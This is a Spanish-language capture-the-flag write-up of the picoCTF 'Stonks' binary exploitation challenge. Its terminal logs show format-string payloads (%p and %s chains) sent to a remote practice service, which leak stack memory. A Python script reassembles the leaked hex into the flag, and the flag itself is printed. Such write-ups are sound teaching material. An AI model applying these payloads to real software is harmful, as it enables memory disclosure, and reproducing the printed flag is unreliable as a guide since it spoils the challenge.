## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Hints

## Solution
Mandamos una salida espesifica mediante %p y se puede ver que aparece un numero en hexadecimal.
Despues se solicito datos en modo de strings de tal forma que como vimos anteriormente la funcion printf() pudiera extraer datos del buffer. Por lo tanto se uso %s.
Despues se usa %p__ para separar hexadecimales y vemos lo que nos regresa.
Al final a prueba y error decodificamos la flag mediante un script en python.
```bash
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation/Stonks]
└─$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p
Buying stonks with token:
0x98f43b0
Portfolio as of Mon May 15 07:16:48 UTC 2023


8 shares of I
31 shares of BQO
3 shares of S
79 shares of J
201 shares of BP
486 shares of R
Goodbye!
-------------------------------
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation/Stonks]
└─$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%s%s%s%s%s%s%s%s%s%s
Buying stonks with token:
timeout: the monitored command dumped core
-------------------------------
└─$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p
Buying stonks with token:
0x9a60490__0x804b000__0x80489c3__0xf7f75d80__0xffffffff__0x1__0x9a5e160__0xf7f83110__0xf7f75dc7__(nil)__0x9a5f180__0x2__0x9a60470__0x9a60490__0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x63343261__0x36613431__0xffce007d__0xf7fb0af8__0xf7f83440__0x96bb9700__0x1
Portfolio as of Mon May 15 07:24:47 UTC 2023

-------------------------------
┌──(ulrich㉿DasMausoleum)-[~/Documentos/Apuntes 8vo Semestre/Binary-Explotation/Stonks]
└─$ python3 deshex.py
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}


```

```python
  GNU nano 7.2                         deshex.py                                   
from binascii import unhexlify
flag = b"".join(
        [
                unhexlify("6f636970")[::-1],
                unhexlify("7b465443")[::-1],
                unhexlify("306c5f49")[::-1],
                unhexlify("345f7435")[::-1],
                unhexlify("6d5f6c6c")[::-1],
                unhexlify("306d5f79")[::-1],
                unhexlify("5f79336e")[::-1],
                unhexlify("63343261")[::-1],
                unhexlify("36613431")[::-1],
                unhexlify("007d")[::-1],
        ]
).decode()
print(flag)
```
## Flag
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}


## Aditional Notes

## References
